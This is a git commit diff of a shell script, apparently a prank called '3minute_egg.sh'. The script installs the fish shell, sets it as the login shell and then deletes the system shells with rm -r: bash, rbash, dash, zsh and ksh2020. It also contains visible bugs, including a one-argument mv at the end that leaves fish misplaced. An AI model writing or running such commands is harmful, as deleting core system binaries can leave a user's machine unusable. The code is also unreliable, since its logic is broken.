b75ca50ac97affb297fdf72e228a0432e132e758
haly7 <95950223+haly7@users.noreply.github.com>
2022-02-07 13:16:34 -0600

    Update 3minute_egg.sh

--- 3minute_egg.sh
+++ 3minute_egg.sh
@@ -1,35 +1,33 @@
-case 
 #!/bin/sh
 
 distro=$(grep -w ID\=* /etc/os-release | cut -c 4-)
 
-$distro
-     
-if [ "$distro" == Debian | Ubuntu | Linux Mint] then
-apt install fish
-;;
-
-if [ "$distro" ==  Manjaro | Arch ] then
-pacman -S fish
-;;
-
-if [ "$distro" == Fedora ] then
-dnf install fish
-;;
+case $distro in
+    debian|ubuntu|linuxmint)
+        apt install fish;;
+    manjaro|arch)
+        pacman -S fish;;
+    Fedora)
+        yum install fish;;
+    *) ;;
 esac
 
-mv /bin/fish /bin/3minuteegg
+    chsh -s `which fish`
+    
+    mkdir /bin/fivh
+    
+mv /bin/fish /bin/fivh
 
-rm /bin/bash
-rm /usr/bin/bash
-rm /bin/rbash
-rm /usr/bin/rbash
-rm /bin/dash
-rm /usr/bin/dash
-rm /bin/zsh
-rm /usr/bin/zsh
-rm /usr/bin/ksh2020
-rm /usr/bin/rksh2020
+rm -r /bin/bash
+rm -r /usr/bin/bash
+rm -r /bin/rbash
+rm -r /usr/bin/rbash
+rm -r /bin/dash
+rm -r /usr/bin/dash
+rm -r /bin/zsh
+rm -r /usr/bin/zsh
+rm -r /usr/bin/ksh2020
+rm -r /usr/bin/rksh2020
 
 
-mv /bin/3minuteegg /bin/fish
+mv /bin/fivh/bin/fish
